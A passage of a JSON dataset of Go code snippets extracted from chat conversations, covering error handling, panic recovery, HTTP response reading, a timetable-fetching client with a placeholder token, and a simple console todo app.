    "filename": "8e4434aa12358517960ba7972ef12efc_5.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "type MyError struct {\n    Message string\n    Code    int\n}\n\nfunc (e *MyError) Error() string {\n    return fmt.Sprintf(\"%d - %s\", e.Code, e.Message)\n}\n\nfunc mightFailWithCustomError(flag bool) (string, error) {\n    if flag {\n        return \"\", &MyError{\n            Message: \"something specifically went wrong\",\n            Code:    400,\n        }\n    }\n    return \"all good\", nil\n}\n\nfunc main() {\n    _, err := mightFailWithCustomError(true)\n    if err != nil {\n        switch e := err.(type) {\n        case *MyError:\n            fmt.Printf(\"MyError: Code=%d, Message=%s\\n\", e.Code, e.Message)\n        default:\n            fmt.Println(\"Generic error:\", err)\n        }\n        return\n    }\n}",
    "filename": "8e4434aa12358517960ba7972ef12efc_6.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc mayPanic() {\n    panic(\"something bad happened\")\n}\n\nfunc main() {\n    defer func() {\n        if r := recover(); r != nil {\n            fmt.Println(\"Recovered in main:\", r)\n        }\n    }()\n    \n    mayPanic()\n    fmt.Println(\"This line will not be executed.\")\n}",
    "filename": "8e4434aa12358517960ba7972ef12efc_7.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 8,
    "language": "Go",
    "libraries": [
      "an"
    ],
    "code": "import (\n\t\"io\"\n\t\"net/http\"\n)\n\n// Assume resp is an *http.Response obtained from an earlier http request\nbody, err := io.ReadAll(resp.Body)\nif err != nil {\n\treturn \"\", err // handle error appropriately\n}",
    "filename": "8e4434aa12358517960ba7972ef12efc_8.go"
  },
  {
    "conversation_hash": "8e4434aa12358517960ba7972ef12efc",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "resp, err := http.Get(\"http://example.com\")\nif err != nil {\n\t// handle error\n}\ndefer resp.Body.Close()\n\nbody, err := io.ReadAll(resp.Body)\nif err != nil {\n\t// handle error\n}\n// use body",
    "filename": "8e4434aa12358517960ba7972ef12efc_9.go"
  },
  {
    "conversation_hash": "fd1bc1be8b71628627f1d69628ac0efe",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nconst BASE_URL = \"http://example.com\" // replace with the actual base URL\n\ntype Child struct {\n\tId      string `json:\"Id\"`\n\tConType int    `json:\"ConType\"`\n\tDate    string `json:\"Date\"`\n\tTitle   string `json:\"Title\"`\n\tDetail  string `json:\"Detail\"`\n\tPreview string `json:\"Preview\"`\n}\n\ntype Plan struct {\n\tChilds []Child `json:\"Childs\"`\n}\n\ntype ProcessedPlan struct {\n\tId           string `json:\"id\"`\n\tIsHTML       bool   `json:\"is_html\"`\n\tUploadedDate string `json:\"uploaded_date\"`\n\tTitle        string `json:\"title\"`\n\tURL          string `json:\"url\"`\n\tPreviewURL   string `json:\"preview_url\"`\n}\n\nfunc getPlans(token string) ([]ProcessedPlan, error) {\n\tclient := &http.Client{}\n\treq, err := http.NewRequest(\"GET\", BASE_URL+\"/dsbtimetables\", nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tq := req.URL.Query()\n\tq.Add(\"authid\", token)\n\treq.URL.RawQuery = q.Encode()\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar rawPlans []Plan\n\terr = json.Unmarshal(body, &rawPlans)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar plans []ProcessedPlan\n\n\tfor _, plan := range rawPlans {\n\t\tfor _, i := range plan.Childs {\n\t\t\tp := ProcessedPlan{\n\t\t\t\tId:           i.Id,\n\t\t\t\tIsHTML:       i.ConType == 6,\n\t\t\t\tUploadedDate: i.Date,\n\t\t\t\tTitle:        i.Title,\n\t\t\t\tURL:          i.Detail,\n\t\t\t\tPreviewURL:   \"https://light.dsbcontrol.de/DSBlightWebsite/Data/\" + i.Preview,\n\t\t\t}\n\n\t\t\tplans = append(plans, p)\n\t\t}\n\t}\n\n\treturn plans, nil\n}\n\nfunc main() {\n\ttoken := \"your-token-here\" // Replace with your actual token\n\tplans, err := getPlans(token)\n\tif err != nil {\n\t\tfmt.Println(\"Error fetching plans:\", err)\n\t\treturn\n\t}\n\tfmt.Println(plans)\n}",
    "filename": "fd1bc1be8b71628627f1d69628ac0efe_0.go"
  },
  {
    "conversation_hash": "fd1bc1be8b71628627f1d69628ac0efe",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type Child struct {\n\tId      string `json:\"Id\"`\n\tConType int    `json:\"ConType\"`\n\tDate    string `json:\"Date\"`\n\tTitle   string `json:\"Title\"`\n\tDetail  string `json:\"Detail\"`\n\tPreview string `json:\"Preview\"`\n}\n\ntype Plan struct {\n\tChilds []Child `json:\"Childs\"`\n}\n\n//...rest of the code remains the same.",
    "filename": "fd1bc1be8b71628627f1d69628ac0efe_2.go"
  },
  {
    "conversation_hash": "90ffa454f2b3d695dafd3e91bb925d9e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n)\n\n// Assuming a struct representation of your data based on the provided snippet\ntype Child struct {\n    Id      string\n    ConType int\n    Date    string\n    Title   string\n    Detail  string\n    Preview string\n}\n\ntype Plan struct {\n    Childs []Child\n}\n\n// The target struct which holds the transformed child information\ntype TransformedChild struct {\n    ID           string\n    IsHTML       bool\n    UploadedDate string\n    Title        string\n    URL          string\n    PreviewURL   string\n}\n\n\nfunc main() {\n    // Example usage\n    raw_plans := []Plan{\n        // Assuming you have populated this with relevant data\n    }\n\n    var plans []TransformedChild\n\n    for _, plan := range raw_plans {\n        for _, child := range plan.Childs {\n            newChild := TransformedChild{\n                ID:           child.Id,\n                IsHTML:       child.ConType == 6,\n                UploadedDate: child.Date,\n                Title:        child.Title,\n                URL:          child.Detail,\n                PreviewURL:   \"https://light.dsbcontrol.de/DSBlightWebsite/Data/\" + child.Preview,\n            }\n            plans = append(plans, newChild)\n        }\n    }\n\n    // For example, to print the transformed plans\n    for _, plan := range plans {\n        fmt.Println(plan)\n    }\n}",
    "filename": "90ffa454f2b3d695dafd3e91bb925d9e_0.go"
  },
  {
    "conversation_hash": "5852e1e00014044941a8eab24cc933db",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"fmt\"\n    \"os\"\n    \"strconv\"\n    \"strings\"\n)\n\n// Todo represents a todo item with an ID and a task description.\ntype Todo struct {\n    ID          int\n    Description string\n    Completed   bool\n}\n\n// TodoList is a slice of Todo items.\nvar TodoList []Todo\nvar nextID int = 1\n\n// CreateTodo adds a new todo to the TodoList.\nfunc CreateTodo(description string) {\n    TodoList = append(TodoList, Todo{ID: nextID, Description: description})\n    nextID++\n}\n\n// ListTodos prints all todos to the console.\nfunc ListTodos() {\n    for _, todo := range TodoList {\n        completedStatus := \"not completed\"\n        if todo.Completed {\n            completedStatus = \"completed\"\n        }\n        fmt.Printf(\"%d: %s [%s]\\n\", todo.ID, todo.Description, completedStatus)\n    }\n}\n\n// CompleteTodo marks a todo as completed.\nfunc CompleteTodo(id int) {\n    for i, todo := range TodoList {\n        if todo.ID == id {\n            TodoList[i].Completed = true\n            fmt.Println(\"Todo completed!\")\n            return\n        }\n    }\n    fmt.Println(\"Todo with specified ID not found.\")\n}\n\n// DeleteTodo removes a todo by its ID.\nfunc DeleteTodo(id int) {\n    for i, todo := range TodoList {\n        if todo.ID == id {\n            TodoList = append(TodoList[:i], TodoList[i+1:]...)\n            fmt.Println(\"Todo deleted!\")\n            return\n        }\n    }\n    fmt.Println(\"Todo with specified ID not found.\")\n}\n\nfunc main() {\n    scanner := bufio.NewScanner(os.Stdin)\n\n    for {\n        fmt.Println(\"\\nTodo App\")\n        fmt.Println(\"1. Add Todo\")\n        fmt.Println(\"2. List Todos\")\n        fmt.Println(\"3. Complete Todo\")\n        fmt.Println(\"4. Delete Todo\")\n        fmt.Println(\"5. Exit\")\n        fmt.Print(\"\\nEnter choice: \")\n\n        scanner.Scan()\n        choice := scanner.Text()\n\n        switch choice {\n        case \"1\":\n            fmt.Print(\"Enter todo description: \")\n            scanner.Scan()\n            CreateTodo(scanner.Text())\n        case \"2\":\n            ListTodos()\n        case \"3\":\n            fmt.Print(\"Enter todo ID to complete: \")\n            scanner.Scan()\n            id, _ := strconv.Atoi(scanner.Text())\n            CompleteTodo(id)\n        case \"4\":\n            fmt.Print(\"Enter todo ID to delete: \")\n            scanner.Scan()\n            id, _ := strconv.Atoi(scanner.Text())\n            DeleteTodo(id)\n        case \"5\":\n            fmt.Println(\"Exiting...\")\n            return\n        default:\n            fmt.Println(\"Invalid choice, please choose again.\")\n        }\n    }\n}",
    "filename": "5852e1e00014044941a8eab24cc933db_0.go"
  }
]